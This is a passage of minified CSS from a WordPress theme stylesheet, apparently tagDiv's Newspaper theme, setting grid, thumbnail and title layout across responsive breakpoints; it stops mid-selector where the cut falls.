.td-icon-font{font-size:12px;width:30px;height:24px;line-height:24px}.td_module_6{padding-bottom:26px}.td_module_6 .td-module-thumb{position:absolute;left:0;top:0}.td_module_6 .item-details{margin-left:116px;min-height:70px}@media (min-width:768px) and (max-width:1018px){.td_module_6 .td-module-thumb{width:80px}.td_module_6 .item-details{margin-left:95px;min-height:55px}.td_block_inner .td_module_mx2 .item-details{margin-left:95px}.td_block_inner .td_module_mx2 .td-post-category{margin-bottom:5px}.td_block_inner .td_module_mx2 .td-icon-star,.td_block_inner .td_module_mx2 .td-icon-star-empty,.td_block_inner .td_module_mx2 .td-icon-star-half{font-size:15px;width:17px}}.td_module_6 .entry-title{font-size:14px;line-height:20px;margin-bottom:4px;font-weight:500}@media (min-width:768px) and (max-width:1140px){.td_module_6 .entry-title{font-size:12px;line-height:18px}.td_block_big_grid_fl_7.td-grid-style-4 .td_module_mx24 .td-meta-info-container{width:100%;max-width:none}}@media (max-width:767px){.td-social-icon-wrap{margin:0 3px}.td_module_6 .entry-title{font-size:14px}}.td_module_6 .td-module-meta-info{margin-bottom:0;min-height:0}.td_module_17 .td-icon-menu-right{font-size:9px;margin-left:8px;vertical-align:middle}.td_module_18 .td-icon-menu-right{font-size:9px;margin-left:8px;vertical-align:middle}.td_module_mx2{padding-bottom:0}.td_module_mx2:after,.td_module_mx2:before{display:table;content:"";line-height:0}.td_module_mx2:after{clear:both}.td_module_mx2 .entry-title{font-size:13px;font-weight:500;line-height:18px;margin:0 0 5px}.td_module_mx2 .entry-thumb{width:80px}.td_module_mx2 .td-module-thumb{position:absolute;margin-bottom:0}.td_module_mx2 .item-details{margin:0 0 20px 100px;min-height:60px;padding-top:2px}.td_module_mx2.td-module-search-def .item-details{min-height:80px}@media (max-width:767px){.td_block_inner .td_module_mx2 .entry-title{font-size:16px;line-height:22px}.td_block_inner .td_module_mx2 .item-details{margin-bottom:30px}.td_block_padding .td-block-row:last-child>div:last-child .td_module_wrap{padding-bottom:0}}@media (max-width:500px){.td_block_inner .td_module_mx2 .entry-title{font-size:14px;line-height:20px}}.td_block_padding.td-column-1 .td-block-span12:last-child .td_module_wrap{padding-bottom:0}.td_block_padding .td-load-more-wrap,.td_block_padding .td-next-prev-wrap{margin-top:20px}@media (max-width:767px){.td_block_18 .td_module_mx2 .item-details{padding-top:0;margin-bottom:26px}.td_block_18 .td_module_mx2 .item-details .entry-title{margin-bottom:3px}}.td_block_18 .td_module_mx2 .td-module-meta-info{margin-bottom:0}.td_block_18 .td-column-1 .td_module_mx2:last-child .item-details{margin-bottom:0}@media (max-width:767px){.td_block_19 .td_module_mx2 .item-details{padding-top:0;margin-bottom:26px}.td_block_19 .td_module_mx2 .item-details .entry-title{margin-bottom:3px}.td_block_19 .td-block-row:last-child>div:last-child .td_module_wrap.td_module_mx2,.td_block_19 .td-block-row:last-child>div:last-child .td_module_wrap.td_module_mx2 .item-details{margin-bottom:0}}.td_block_19 .td_module_mx2 .td-module-meta-info{margin-bottom:0}.td_block_19.td-column-1 .td_module_wrap:last-child.td_module_mx2,.td_block_19.td-column-1 .td_module_wrap:last-child.td_module_mx2 .item-details{margin-bottom:0}a[href^=tel]{color:inherit}.iosSlider.td_block_wrap{margin-bottom:34px!important}.td_block_big_grid_fl_6 .td_module_mx22{position:relative;width:33.333%;padding-top:17%}@media (min-width:1018px){.td_block_big_grid_fl_6 .td_module_mx22 .td-meta-info-container{padding:0 28px 18px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-4 .td_module_mx23 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-4 .td_module_mx23 .td-meta-info-container{width:auto;max-width:80%}}@media (min-width:768px) and (max-width:1018px){.td_block_big_grid_fl_6 .td_module_mx22 .td-meta-info-container{padding-left:14px;padding-right:14px}.td_block_big_grid_fl_6 .td_module_mx22 .td-meta-info-container .td-module-meta-info{display:none}.td_block_big_grid_fl_6 .td_module_mx22{padding-top:19%}.td_block_big_grid_fl_6 .td_module_mx22 .entry-title{font-size:13px!important;line-height:18px!important}}@media (max-width:767px){.td_block_big_grid_fl_6 .td_module_mx22{width:100%;padding:0;float:none}}.td_block_big_grid_fl_6 .td_module_mx22 .entry-thumb{max-width:none}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_6 .td_module_mx22,.td-full-layout .td-stretch-content .td_block_big_grid_fl_6 .td_module_mx22{padding-top:12%}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_6 .td_module_mx22,.td-full-layout .td-stretch-content .td_block_big_grid_fl_6 .td_module_mx22{padding-top:16%}.td_block_big_grid_fl_7.td-grid-style-4 .td_module_mx23 .td-meta-info-container .td-module-meta-info{display:none}}@media (min-width:1019px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_6.td-grid-style-4 .td_module_mx22 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_6.td-grid-style-4 .td_module_mx22 .td-meta-info-container{width:auto;max-width:80%}}.td_block_big_grid_fl_7 .td_module_mx23{width:33.33333333%;margin-bottom:10px;padding-top:26%}@media (min-width:1140px){.td_block_big_grid_fl_6 .td_module_mx22 .entry-thumb{min-width:100%;width:auto}.td_block_big_grid_fl_6.td-grid-style-2 .td_module_mx22 .td-big-grid-meta,.td_block_big_grid_fl_6.td-grid-style-2 .td_module_mx22 .td-module-meta-info,.td_block_big_grid_fl_6.td-grid-style-3 .td_module_mx22 .td-big-grid-meta,.td_block_big_grid_fl_6.td-grid-style-3 .td_module_mx22 .td-module-meta-info,.td_block_big_grid_fl_6.td-grid-style-7 .td_module_mx22 .td-big-grid-meta,.td_block_big_grid_fl_6.td-grid-style-7 .td_module_mx22 .td-module-meta-info{padding-left:28px;padding-right:28px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_6 .td_module_mx22 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_6 .td_module_mx22 .entry-title{font-size:17px;line-height:22px}.td_block_big_grid_fl_7 .td_module_mx23 .entry-title{font-size:17px;line-height:22px}.td_block_big_grid_fl_7 .td_module_mx23 .td-meta-info-container{padding:0 15px 18px}}@media (min-width:768px) and (max-width:1018px){.td_block_big_grid_fl_6.td-grid-style-2 .td_module_mx22 .td-big-grid-meta,.td_block_big_grid_fl_6.td-grid-style-2 .td_module_mx22 .td-module-meta-info,.td_block_big_grid_fl_6.td-grid-style-3 .td_module_mx22 .td-big-grid-meta,.td_block_big_grid_fl_6.td-grid-style-3 .td_module_mx22 .td-module-meta-info,.td_block_big_grid_fl_6.td-grid-style-7 .td_module_mx22 .td-big-grid-meta,.td_block_big_grid_fl_6.td-grid-style-7 .td_module_mx22 .td-module-meta-info{padding-left:14px;padding-right:14px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_6 .td_module_mx22,.td-full-layout .td-stretch-content .td_block_big_grid_fl_6 .td_module_mx22{padding-top:18%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_6.td-grid-style-4 .td_module_mx22 .td-meta-info-container .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_6.td-grid-style-4 .td_module_mx22 .td-meta-info-container .td-module-meta-info{display:none}.td_block_big_grid_fl_7 .td_module_mx23{padding-top:27%;margin-bottom:4px}.td_block_big_grid_fl_7 .td_module_mx23 .entry-title{font-size:13px!important;line-height:18px!important}.td_block_big_grid_fl_7 .td_module_mx23 .td-module-meta-info{display:none}}@media (max-width:767px){.td_block_big_grid_fl_7 .td_module_mx23{width:100%;margin-bottom:0;padding:0;float:none}}.td_block_big_grid_fl_7 .td_module_mx24{position:relative;width:20%;height:0;padding-top:15%}@media (min-width:768px){.td-header-style-7 .td-header-sp-logo img{top:-1px}.td-header-style-7 .td-affix .td-header-sp-logo img{top:0}.td_block_padding .td-block-row:last-child .td_module_wrap{padding-bottom:0}.td_block_19 .td-block-row:last-child .td_module_wrap.td_module_mx2,.td_block_19 .td-block-row:last-child .td_module_wrap.td_module_mx2 .item-details{margin-bottom:0}.td_block_big_grid_fl_7 .td_module_mx24 .td-module-meta-info{display:none}}@media (min-width:1140px){.td_block_big_grid_fl_7 .td_module_mx24 .entry-title{font-size:13px;line-height:18px}.td_block_big_grid_fl_7 .td_module_mx24 .td-meta-info-container{padding:0 10px 13px}.td_block_big_grid_fl_7 .td_module_mx24 .entry-thumb{min-width:100%;width:auto}}@media (min-width:768px) and (max-width:1018px){.td_block_big_grid_fl_7 .td_module_mx24{padding-top:18%}.td_block_big_grid_fl_7 .td_module_mx24 .entry-title{font-size:10px!important;line-height:13px!important}.td_block_big_grid_fl_7.td-grid-style-4 .td_module_mx23 .td-meta-info-container{width:100%;max-width:none}}@media (max-width:767px){.td_block_big_grid_fl_7 .td_module_mx24{width:100%;padding:0;float:none}}.td_block_big_grid_fl_7 .td_module_mx24 .entry-thumb{max-width:none}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23{padding-top:18%}@media (min-width:1140px){.td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-module-meta-info,.td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-module-meta-info,.td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-module-meta-info{padding-left:15px;padding-right:15px}.td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx24 .td-big-grid-meta,.td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx24 .td-module-meta-info,.td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx24 .td-big-grid-meta,.td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx24 .td-module-meta-info,.td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx24 .td-big-grid-meta,.td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx24 .td-module-meta-info{padding-left:10px;padding-right:10px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23 .entry-title{font-size:19px;line-height:24px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23 .td-meta-info-container{padding:0 20px 20px}}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23{padding-top:22%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23 .entry-title{font-size:17px;line-height:22px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23 .td-meta-info-container{padding:0 20px 18px}}@media (min-width:768px) and (max-width:1018px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23{padding-top:25%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23 .entry-title{font-size:17px;line-height:22px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx23 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx23 .td-meta-info-container{padding:0 13px 12px}}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx24,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx24{padding-top:12%}@media (min-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx24 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx24 .entry-title{font-size:15px;line-height:20px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx24 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx24 .td-meta-info-container{padding:0 18px 18px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-module-meta-info{padding-left:18px;padding-right:18px}}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx24,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx24{padding-top:14%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-module-meta-info{padding-left:15px;padding-right:15px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta{padding-top:15px}}@media (min-width:768px) and (max-width:1018px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7 .td_module_mx24,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7 .td_module_mx24{padding-top:16%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-module-meta-info{padding-left:13px;padding-right:13px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx23 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx23 .td-big-grid-meta{padding-top:13px}}.td_block_big_grid_fl_8 .td_module_mx25{width:25%;padding-top:18%}@media (min-width:1018px){.td_block_big_grid_fl_8 .td_module_mx25 .entry-title{font-size:13px;line-height:18px}.td_block_big_grid_fl_8 .td_module_mx25 .td-meta-info-container{padding:0 10px 13px}.td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-module-meta-info{padding-left:10px;padding-right:10px}}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25{padding-top:14%}@media (min-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx24 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx24 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx24 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx24 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx24 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx24 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx24 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-2 .td_module_mx24 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx24 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-3 .td_module_mx24 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx24 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-7 .td_module_mx24 .td-module-meta-info{padding-left:18px;padding-right:18px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_7.td-grid-style-4 .td_module_mx24 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_7.td-grid-style-4 .td_module_mx24 .td-meta-info-container{width:auto;max-width:85%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25 .entry-title{font-size:19px;line-height:24px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25 .td-meta-info-container{padding:0 20px 18px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-module-meta-info{padding-left:20px;padding-right:20px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-4 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-4 .td_module_mx25 .td-meta-info-container{width:auto;max-width:80%}}@media (min-width:768px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-7 .td_module_mx25 .td-module-meta-info{padding-left:10px;padding-right:10px}.td_block_big_grid_fl_9.td-grid-style-4 .td_module_mx25 .td-meta-info-container,.td_block_big_grid_fl_9.td-grid-style-4 .td_module_mx26 .td-meta-info-container{width:100%;max-width:none}}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25{padding-top:18%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25 .entry-title{font-size:15px;line-height:20px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25 .td-post-category,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25 .td-post-category{margin-bottom:10px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25 .td-meta-info-container{padding:0 10px 18px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-meta-info-container{padding:0 14px 16px}}@media (min-width:768px) and (max-width:1018px){.td_block_big_grid_fl_8 .td_module_mx25{padding-top:22%}.td_block_big_grid_fl_8 .td_module_mx25 .entry-title{font-size:12px!important;line-height:15px!important}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25{padding-top:20%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25 .entry-title{font-size:12px!important;line-height:15px!important}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8 .td_module_mx25 .td-meta-info-container{padding:0 10px 13px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_8.td-grid-style-2 .td_module_mx25 .td-meta-info-container{padding:0 13px 9px}}.td_block_big_grid_fl_9 .td_module_mx26{width:50%;padding-top:22%}@media (min-width:1018px){.td_block_big_grid_fl_9 .td_module_mx26 .entry-title{font-size:17px;line-height:22px}.td_block_big_grid_fl_9 .td_module_mx26 .td-meta-info-container{padding:0 15px 18px}.td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx26 .td-big-grid-meta,.td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx26 .td-module-meta-info,.td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx26 .td-big-grid-meta,.td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx26 .td-module-meta-info,.td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx26 .td-big-grid-meta,.td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx26 .td-module-meta-info{padding-left:15px;padding-right:15px}.td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx25 .td-module-meta-info{padding-left:10px;padding-right:10px}}@media (min-width:768px) and (max-width:1018px){.td_block_big_grid_fl_9 .td_module_mx26{padding-top:25%}.td_block_big_grid_fl_9 .td_module_mx26 .entry-title{font-size:15px!important;line-height:20px!important}}.td_block_big_grid_fl_9 .td_module_mx25{width:25%;padding-top:16%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx26,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx26{padding-top:21%}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx26,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx26{padding-top:21%}}@media (min-width:768px) and (max-width:1018px){.td_block_big_grid_fl_9 .td_module_mx25{padding-top:17%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 